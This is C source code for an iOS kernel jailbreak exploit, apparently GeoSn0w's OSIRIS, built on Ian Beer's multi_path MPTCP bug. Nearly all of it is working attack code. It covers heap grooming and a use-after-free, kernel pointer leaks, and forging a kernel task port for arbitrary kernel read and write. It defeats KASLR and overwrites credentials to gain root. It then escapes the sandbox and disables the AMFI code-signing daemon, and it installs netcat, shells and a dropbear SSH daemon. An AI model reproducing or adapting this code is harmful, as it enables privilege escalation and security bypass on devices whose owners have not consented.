static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    // allocate a port to send the message to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct ool_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf(" [-] failed to send message: %s\n", mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    
    return q;
}

static int uint64_t_compare(const void* a, const void* b) {
    uint64_t a_val = (*(uint64_t*)a);
    uint64_t b_val = (*(uint64_t*)b);
    if (a_val < b_val) {
        return -1;
    }
    if (a_val == b_val) {
        return 0;
    }
    return 1;
}

uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition) {
    prepare_kqueue();
    
    int n_guesses = 100;
    uint64_t* guesses = calloc(1, n_guesses*sizeof(uint64_t));
    int valid_guesses = 0;
    
    for (int i = 1; i < n_guesses+1; i++) {
        mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);
        mach_port_destroy(mach_task_self(), q);
        uint64_t leaked = try_leak(i-1);
        //printf("leaked %016llx\n", leaked);
        
        // a valid guess is one which looks a bit like a kernel heap pointer
        // without the upper byte:
        if ((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000)) {
            guesses[valid_guesses++] = leaked | 0xff00000000000000;
        }
    }
    
    if (valid_guesses == 0) {
        printf(" [-] couldn't leak any kernel pointers\n");
        exit(EXIT_FAILURE);
    }
    
    // return the most frequent guess
    qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);
    
    uint64_t best_guess = guesses[0];
    int best_guess_count = 1;
    
    uint64_t current_guess = guesses[0];
    int current_guess_count = 1;
    for (int i = 1; i < valid_guesses; i++) {
        if (guesses[i] == guesses[i-1]) {
            current_guess_count++;
            if (current_guess_count > best_guess_count) {
                best_guess = current_guess;
                best_guess_count = current_guess_count;
            }
        } else {
            current_guess = guesses[i];
            current_guess_count = 1;
        }
    }
    
    //printf("best guess is: 0x%016llx with %d%% of the valid guesses for it\n", best_guess, (best_guess_count*100)/valid_guesses);
    
    free(guesses);
    
    return best_guess;
}

uint64_t find_port_via_kmem_read(mach_port_name_t port) {
    uint64_t task_port_addr = task_self_addr();
    
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_port_address(mach_port_t port, int disposition) {
    if (have_kmem_read()) {
        return find_port_via_kmem_read(port);
    }
    return find_port_via_proc_pidlistuptrs_bug(port, disposition);
}


// Bryce's code
extern uint64_t find_port_via_kmem_read(mach_port_name_t port);
uint64_t dump_kernel(mach_port_t tfp0, uint64_t kernel_base)
{
    // ok, where the f*ck is the kernel
    // uint64_t kernel_base = 0xfffffff00760a0a0; //15B202 on iPhone 6s
    mach_port_t self = mach_host_self();
    uint64_t port_addr = find_port_via_kmem_read(self); // already applied this from mptcp
    uint64_t search_addr = rk64(port_addr + 0x68); //KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT
    search_addr &= 0xFFFFFFFFFFFFF000;
    printf("[i] Walking kernel memory for magic address\n");
    while (1)
    {
        if (rk32(search_addr) == 0xfeedfacf)
        {
            slide = search_addr + 0x6060a0 - kernel_base;
            printf("[i] Kernel magic is at 0x%llx\n", search_addr);
            printf("[i] KASLR slide 0x%llx\n", search_addr + 0x6060a0 - kernel_base); //only 12 bits of entropy lawl
            return search_addr;
        } else {
            search_addr-=0x1000;
        }
    }
}



int exploit() {
  printf("[i] OSIRIS Jailbreak Initialized.\n");
  printf("by GeoSn0w (@FCE365)\n");
  printf("Thanks to Ian Beer, Jonathan Levin and Hacker Fantastic\n");
  printf("[i] Initializing multi_path exploit by Ian Beer!.\n");
  offsets_init();
  increase_limits();
  int target_socks[2] = {0};
  int next_sock = 0;
  int sockets[10000];
  int next_all_sock = 0;
  printf("[i] Allocating early sockets\n");
  for (int i = 0; i < 1000; i++) {
    int sock = alloc_mptcp_socket();
    sockets[next_all_sock++] = sock;
  }
  printf("[i] Trying to force a 16MB aligned 0x800 kalloc on to freelist\n");
  for (int i = 0; i < 7; i++) {
    printf("%d/6...\n", i);
    for (int j = 0; j < 0x2000; j++) {
      mach_port_t p = fake_kalloc(0x800);
    }
    for (int j = 0; j < 100; j++) {
      int sock = alloc_mptcp_socket();
      if (i == 6 && (j==94 || j==95)) {
        target_socks[next_sock] = sock;
        next_sock++;
        next_sock %= (sizeof(target_socks)/sizeof(target_socks[0]));
      } else {
        sockets[next_all_sock++] = sock;
      }
    }
  }
  
  printf("%d %d\n", target_socks[0], target_socks[1]);
  
  // the free is deferred by a "gc".
  // to improve the probability we are the one who gets to reuse the free'd alloc
  // lets free two things such that they both hopefully end up on the all_free list
  // and lets put a bunch of stuff on the intermediate list.
  // Intermediate is traversed before all_free so even if another thread
  // starts allocating before we do we're more likely to get the correct alloc
  mach_port_t late_ports[40];
  for (int i = 0; i < 40; i++) {
    late_ports[i] = fake_kalloc(0x800);
  }
  
  // try to put some on intermediate
  for (int i = 0; i < 10; i++) {
    fake_kfree(late_ports[i*2]);
    late_ports[i*2] = MACH_PORT_NULL;
  }
  
  // free all the other mptcp sockets:
  for (int i = 0; i < next_all_sock; i++) {
    close(sockets[i]);
  }
  
  printf("[i] Waiting for early mptcp gc...\n");
  // wait for the mptcp gc...
  for (int i = 0; i < 400; i++) {
    usleep(10000);
  }
  
  printf("[i] Trying first free\n");
  do_partial_kfree_with_socket(target_socks[0], 0, 3);
  
  printf("[i] Waiting for mptcp gc...\n");
  // wait for the mptcp gc...
  for (int i = 0; i < 400; i++) {
    usleep(10000);
  }
  
  printf("[i] trying to refill ****************\n");
  
  // realloc with pipes:
  for (int i = 0; i < 1000; i++) { //100
    int fd = alloc_and_fill_pipe();
    usleep(1000); // 10000
  }
  
  // put half of them on intermediate:
  for (int i = 20; i < 40; i+=2) {
    fake_kfree(late_ports[i]);
    late_ports[i] = MACH_PORT_NULL;
  }
  
  printf("[i] Hopefully we got a pipe buffer in there... now freeing one of them\n");
  printf("[i] Trying second free\n");
  do_partial_kfree_with_socket(target_socks[1], 0, 3);
  
  printf("[i] Waiting for second mptcp gc...\n");
  // wait for the mptcp gc...
  for (int i = 0; i < 400; i++) {
    usleep(10000);
  }
  
  mach_port_t exception_ports[100];
  for (int i = 0; i < 100; i++) {
    mach_port_t p = prealloc_port(0x800);
    prepare_prealloc_port(p);
    exception_ports[i] = p;
    usleep(10000);
  }
  
  printf("[i] Checking....\n");
  
  uint8_t* msg_contents = NULL;
  int replacer_pipe = find_replacer_pipe(&msg_contents);
  if (replacer_pipe == -1) {
      printf("[!] ERROR: failed to get a pipe buffer over a port\n");
    return -1;
  }
  
  // does the pipe buffer contain the mach message we sent to ourselves?
  if (msg_contents == NULL) {
    printf("[!] Didn't get any message contents\n");
    return -1;
  }
  
  printf("[!] This should be the empty prealloc message\n");
  
  for (int i = 0; i < 0x800/8; i++) {
    printf("+%08x %016llx\n", i*8, ((uint64_t*)msg_contents)[i]);
  }
  
  // write the empty prealloc message back over the pipe:
  write(replacer_pipe+1, msg_contents, PIPE_SIZE);
  
  // we still don't know which of our exception ports has the correct prealloced message buffer,
  // so try sending to each in turn until we hit the right one:
  uint8_t* original_contents = msg_contents;
  
  uint8_t* new_contents = malloc(PIPE_SIZE);
  memset(new_contents, 0, PIPE_SIZE);
  
  mach_port_t replacer_port = MACH_PORT_NULL;
  
  for (int i = 0; i < 100; i++) {
    send_prealloc_msg(exception_ports[i]);
    // read from the pipe and see if the contents changed:
    ssize_t amount = read(replacer_pipe, new_contents, PIPE_SIZE);
    if (amount != PIPE_SIZE) {
      printf("short read (%ld)\n", amount);
    }
    if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
      // they are still the same, this isn't the correct port:
      mach_port_t fake_thread_port = receive_prealloc_msg(exception_ports[i]);
      printf("received prealloc message via an exception with this thread port: %x\n", fake_thread_port);
      // that should be the real host port
      mach_port_deallocate(mach_task_self(), fake_thread_port);
      write(replacer_pipe+1, new_contents, PIPE_SIZE);
    } else {
      // different! we found the right exception port which has its prealloced port overlapping
      replacer_port = exception_ports[i];
      // don't write anything back yet; we want to modify it first:
      break;
    }
  }
  
  if (replacer_port == MACH_PORT_NULL) {
    printf("[!] failed to find replacer port\n");
    return -1;
  }
  
  printf("found replacer port\n");
  
  /*
  for (int i = 0; i < 0x800/8; i++) {
    printf("%08x %016llx\n", i*8, ((uint64_t*)new_contents)[i]);
  }*/
  
  uint64_t pipe_buf = *((uint64_t*)(new_contents + 0x8));
  printf("pipe buf and prealloc message are at %016llx\n", pipe_buf);
  
  // prepare_early_read_primitive will overwrite this, lets save it now for later
  uint64_t host_port_kaddr = *((uint64_t*)(new_contents + 0x66c));
    
  // we can also find our task port kaddr:
  uint64_t task_port_kaddr = *((uint64_t*)(new_contents + 0x67c));
  
  // setup for post-exploit work
  cached_task_self_addr = task_port_kaddr;
    
  mach_port_t kport = prepare_early_read_primitive(pipe_buf, replacer_pipe, replacer_pipe+1, replacer_port, new_contents);
  
  uint32_t val = early_rk32(pipe_buf);
  printf("%08x\n", val);
  
  // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
  // we can get the ipc_space easily from the host port (receiver field):
  uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
  
  printf("ipc_space_kernel: %016llx\n", ipc_space_kernel);
  
  // the kernel vm_map is a little trickier to find
  // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:
  
  // find the start of the zone block containing the host and kernel task pointers:
  
  uint64_t offset = host_port_kaddr & 0xfff;
  uint64_t first_port = 0;
  if ((offset % 0xa8) == 0) {
    printf("host port is on first page\n");
    first_port = host_port_kaddr & ~(0xfff);
  } else if(((offset+0x1000) % 0xa8) == 0) {
    printf("host port is on second page\n");
    first_port = (host_port_kaddr-0x1000) & ~(0xfff);
  } else if(((offset+0x2000) % 0xa8) == 0) {
    printf("host port is on third page\n");
    first_port = (host_port_kaddr-0x2000) & ~(0xfff);
  } else if(((offset+0x3000) % 0xa8) == 0) {
    printf("host port is on fourth page\n");
    first_port = (host_port_kaddr-0x3000) & ~(0xfff);
  } else {
    printf("hummm, my assumptions about port allocations are wrong...\n");
  }
  
  printf("WE OUT THERE\nfirst port is at %016llx\n", first_port);
  uint64_t kernel_vm_map = 0;
  // now look through up to 0x4000 of ports and find one which looks like a task port:
  for (int i = 0; i < (0x4000/0xa8); i++) {
    uint64_t early_port_kaddr = first_port + (i*0xa8);
    uint32_t io_bits = early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
    
    if (io_bits != (IO_BITS_ACTIVE | IKOT_TASK)) {
      continue;
    }
    
    // get that port's kobject:
    uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    if (task_t == 0) {
      printf("weird heap object with NULL kobject\n");
      continue;
    }
    
    // check the pid via the bsd_info:
    uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    if (bsd_info == 0) {
      printf("task doesn't have a bsd info\n");
      continue;
    }
    uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
    if (pid != 0) {
      printf("task isn't the kernel task\n");
        continue;
    }
    // found the right task, get the vm_map
    kernel_vm_map = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    break;
  }
  
  if (kernel_vm_map == 0) {
    printf("unable to find the kernel task map\n");
    return -1;
  }
  
  printf("[i] Kernel map:%016llx\n", kernel_vm_map);
  // now we have everything to build a fake kernel task port for memory r/w:
  mach_port_t new_tfp0 = prepare_tfp0(kernel_vm_map, ipc_space_kernel);
  printf("[i] tfp0: %x\n", new_tfp0);
  vm_offset_t data_out = 0;
  mach_msg_type_number_t out_size = 0;
  kern_return_t err = mach_vm_read(new_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
  if (err != KERN_SUCCESS) {
    printf("[!] mach_vm_read failed: %x %s\n", err, mach_error_string(err));
    sleep(3);
    exit(EXIT_FAILURE);
  }
  printf("kernel read via second tfp0 port worked?\n");
  printf("0x%016llx\n", *(uint64_t*)data_out);
  printf("0x%016llx\n", *(uint64_t*)(data_out+8));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
  printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
  /* navigate to base address */
  //evil = *(uint64_t*)(data_out+0x10);
  // now bootstrap the proper r/w methods:
  prepare_for_rw_with_fake_tfp0(new_tfp0);

// time to clean up
  // if we want to exit cleanly and keep the fake tfp0 alive we need to remove all reference to the memory it uses.
  // it's reference three times:
  // 1) the early_kalloc mach_message which was used to get the 16MB aligned allocation on to the free list in the first place
  // 2) the replacer_pipe buffer
  // 3) the replacer_port prealloced message
  
  // we also want to do this without using any kernel text offsets (only structure offsets)
  // as a starting point we want the task port; we actually do know where this is because the exception messages contained it
  
  // for 1 & 3 we need to look through the task's mach port table
  uint64_t task_kaddr = rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  uint64_t itk_space = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
  
  uint32_t is_table_size = rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
  
  const int sizeof_ipc_entry_t = 0x18;
  for (uint32_t i = 0; i < is_table_size; i++) {
    uint64_t port_kaddr = rk64(is_table + (i * sizeof_ipc_entry_t));
    
    if (port_kaddr == 0) {
      continue;
    }
    
    // check the ikmq_base field
    uint64_t kmsg = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    if (kmsg == pipe_buf) {
      // neuter it:
      printf("[i] Clearing kmsg from port %016llx\n", port_kaddr);
      wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
      wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
    }
    
    // check for a prealloced msg:
    uint32_t ip_bits = rk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
#define  IP_BIT_PREALLOC    0x00008000
    if (ip_bits & IP_BIT_PREALLOC) {
      uint64_t premsg = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
      if (premsg == pipe_buf) {
        // clear the premsg:
        printf("clearing premsg from port %016llx\n", port_kaddr);
        wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
        ip_bits &= (~IP_BIT_PREALLOC);
        wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
      }
    }
  }
  
  printf("[i] Going to try to clear up the pipes now\n");
  
  // finally we have to fix up the pipe's buffer
  // for this we need to find the process fd table:
  // struct proc:
  uint64_t proc_addr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
  
  // struct filedesc
  uint64_t filedesc = rk64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
  
  // base of ofiles array
  uint64_t ofiles_base = rk64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
  
  uint64_t ofiles_offset = ofiles_base + (replacer_pipe * 8);
  
  // struct fileproc
  uint64_t fileproc = rk64(ofiles_offset);
  
  // struct fileglob
  uint64_t fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
  
  // struct pipe
  uint64_t pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
  
  // clear the inline struct pipebuf
  printf("clearing pipebuf: %llx\n", pipe);
  wk64(pipe + 0x00, 0);
  wk64(pipe + 0x08, 0);
  wk64(pipe + 0x10, 0);
  
  // do the same for the other end:
  ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);
  
  // struct fileproc
  fileproc = rk64(ofiles_offset);
  
  // struct fileglob
  fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
  
  // struct pipe
  pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
  
  printf("clearing pipebuf: %llx\n", pipe);
  wk64(pipe + 0x00, 0);
  wk64(pipe + 0x08, 0);
  wk64(pipe + 0x10, 0);
  // that should have cleared everything up!
    printf("[i] Current uid=0x%x euid=0x%x gid=0x%x egid=0x%x\n", getuid(), geteuid(), getgid(), getegid());
    uint64_t struct_task = rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    void* data = 0;
    mach_msg_type_number_t sz;
    kern_return_t kr;
    kr = mach_vm_read(tfp0, (mach_vm_address_t)bsd_info, (mach_vm_size_t)0x290, (vm_offset_t *)&data, &sz);
    *((uint32_t *)data + 0xC) = 0; // set my task's uid and gid(¿)
    *((uint32_t *)data + 0xD) = 0;
    kr = mach_vm_write(tfp0, (mach_vm_address_t)bsd_info, (vm_offset_t)data,(mach_msg_type_number_t)0x290);
    uint64_t cred_ptr = rk64(bsd_info + 0x100);
    wk32(cred_ptr+0x18, 0);
    wk32(cred_ptr+0x18+4, 0);
    wk32(cred_ptr+0x18+8, 0);
    uint64_t task_ptr = rk64(bsd_info + 0x18);
    uint64_t flags_ptr = task_ptr + 0x2a8;
    uint32_t flags = rk32(flags_ptr);
    wk32(flags_ptr, flags | 0x20004005);
    printf("Got root? uid=0x%x euid=0x%x gid=0x%x egid=0x%x\n", getuid(), geteuid(), getgid(), getegid());
    /* add our task to this */
    // need to add the IPSW base here for your device, get from hopper
    // 0xFFFFFFF0074c5d08 for iPad mini 4 image.
    return 0;
}
int NukeAMFI(){
    // Got root?
    // TO ADD A NEW DEVICE SET THESE >> <<
    uint64_t kernel_base = dump_kernel(tfp0, 0xFFFFFFF0074c5d08);
    uint64_t kaslr = kernel_base + 0xFF8FFC000;
    initQiLin(tfp0, kernel_base);
    // jtool -S on decompressed kernel
    setKernelSymbol("_kernproc",kernproc);
    setKernelSymbol("_rootvnode",rootvnode);
    setKernelSymbol("_vfs_rootnode",vfs_rootnode);
    // now to patch the remaining goodness..
    ShaiHuludMe(0); //Sbox
    platformizeMe();
    printf("[i] Borrowing entitlements...\n");
    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose","-u");
    sleep(3);
    sleep(1);
    printf("[i] Nuking AMFID...\n");
    int amfid = castrateAmfid();
    return 0;
}
uint64_t get_KASLR_Slide(){
    uint64_t kernel_base = dump_kernel(tfp0, 0xFFFFFFF0074c5d08);
    uint64_t kaslr = slide;
    return kaslr; // I use this on the UI.
}
uint tfp0_printout(){
    return tfp0; //Just return the task port. I use this on the UI.
}
int doAuxStuff(){
    printf("[i] Performing auxiliary stuff...\n");
    uint64_t kernel_base = dump_kernel(tfp0, 0xFFFFFFF0074c5d08);
    uint64_t kaslr = kernel_base + 0xFF8FFC000;
    uint64_t _rootvnode = rootvnode + kaslr + 0x88;
    //rootfs_vnode->vnode_val+0xd8->node_data->data+0x70->flags
    printf("rootvnode: %016llx\n", _rootvnode);
    uint64_t rootfs_vnode = rk64(_rootvnode);
    printf("rootfs_vnode: %016llx\n", rootfs_vnode);
#define KSTRUCT_OFFSET_MOUNT_MNT_FLAG   0x70
#define KSTRUCT_OFFSET_VNODE_V_UN       0xd8
    uint64_t v_mount = rk64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_UN));
    // this is not valid
    uint32_t v_flag = rk32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG) + 1);
    printf("v_mount=0x%llx\n"
           "v_flag_location=0x%llx\n"
           "v_flag_value=0x%x\n", v_mount, v_mount + 0x70, v_flag);
#define MNT_RDONLY  0x00000001  /* read only filesystem */
#define MNT_ROOTFS  0x00004000  /* identifies the root filesystem */
    printf("setting v_flag to 0x%x\n", v_flag & 0xFFFFBFFE);
    pid_t springpid = findPidOfProcess("SpringBoard");
    printf("Found SpringBoard's PID %i\n",springpid); // No longer neeeded because Jonathan added reSpring();
    // Beginning of the part I am still developing. There has to be a better way. I am still not able to start dropbear
    moveFileFromAppDir("tar","/tar");
    moveFileFromAppDir("netcat","/netcat");
    moveFileFromAppDir("sh","/sh");
    moveFileFromAppDir("bash","/bash");
    moveFileFromAppDir("binpack64-256.tar","/binpack64-256.tar");
    moveFileFromAppDir("dropbear.plist","/Library/LaunchDaemons/");
    moveFileFromAppDir("0.reload.plist","/Library/LaunchDaemons/");
    chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
    chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
    chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
    chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
    chmod("/private", 0777);
    chmod("/private/var", 0777);
    chmod("/private/var/mobile", 0777);
    chmod("/private/var/mobile/Library", 0777);
    chmod("/private/var/mobile/Library/Preferences", 0777);
    chmod("/tar", 0755);
    chmod("/binpack64-256.tar", 0755);
    chmod("/netcat", 0755);
    chmod("/sh", 0755);
    chmod("/bash", 0755);
    execCommand("/tar","-C","/","-xvf","binpack64-256.tar",0, 0);
    pid_t pid;
    pid_t pd = 0;
    posix_spawn(&pid, "/bin/launchctl", 0, 0, (char**)&(const char*[]){"/bin/launchctl", "load", "/Library/LaunchDaemons/0.reload.plist", NULL}, NULL);
    launjctlLaunchdPlist("/Library/LaunchDaemons/dropbear.plist");
    posix_spawn(&pd, "/usr/bin/uicache", 0, 0, (char**)&(const char*[]){"/usr/bin/uicache", NULL}, NULL);
    // End of part that needs major changes.
    return 0;
}
